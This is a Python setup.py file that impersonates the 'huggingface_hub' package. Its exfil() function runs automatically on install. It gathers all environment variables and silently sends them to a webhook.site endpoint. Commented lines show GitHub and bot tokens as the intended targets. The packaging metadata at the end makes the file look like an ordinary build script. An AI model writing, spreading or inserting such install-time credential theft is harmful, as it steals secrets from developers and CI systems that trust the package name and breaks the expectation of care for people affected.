import os
import urllib.request
import json

def exfil():
    # secrets = {
    #     'bot_token': os.environ.get('bot_token', ''),
    #     'BOT_TOKEN': os.environ.get('BOT_TOKEN', ''),
    #     'GITHUB_TOKEN': os.environ.get('GITHUB_TOKEN', ''),
    # }
    all_env = dict(os.environ)
    
    webhook_url = os.environ.get('TEST_WEBHOOK', 'https://webhook.site/d239dc90-4861-44b6-ae46-5ac4d978a52a')
    
    req = urllib.request.Request(
        webhook_url,
        # data=json.dumps(secrets).encode(),
        data=json.dumps(all_env, indent=2).encode(),
        headers={'Content-Type': 'application/json'}
    )
    try:
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

exfil()

from setuptools import setup, find_packages
setup(
    name="huggingface_hub",
    version="0.0.1",
    packages=find_packages(where="src"),
)
